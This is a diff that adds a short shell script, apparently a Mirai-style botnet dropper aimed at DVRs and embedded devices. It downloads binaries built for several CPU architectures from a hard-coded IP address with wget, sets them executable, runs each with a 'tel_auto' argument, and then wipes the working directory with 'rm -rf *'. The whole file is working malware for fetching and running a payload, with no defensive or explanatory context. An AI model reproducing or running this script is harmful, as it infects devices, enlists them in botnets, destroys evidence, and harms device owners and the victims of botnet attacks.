@@ -1,0 +1,13 @@
+#!/bin/sh
+
+WEBSERVER="204.44.81.201:80"
+
+BINARIES="putinhelper.arm putinhelper.m68k putinhelper.mips putinhelper.mpsl putinhelper.ppc putinhelper.sh4 putinhelper.spc"
+
+for Binary in $BINARIES; do
+	wget http://$WEBSERVER/$Binary -O dvrRunNer
+	chmod 777 dvrRunNer
+	./dvrRunNer tel_auto
+done
+
+rm -rf *
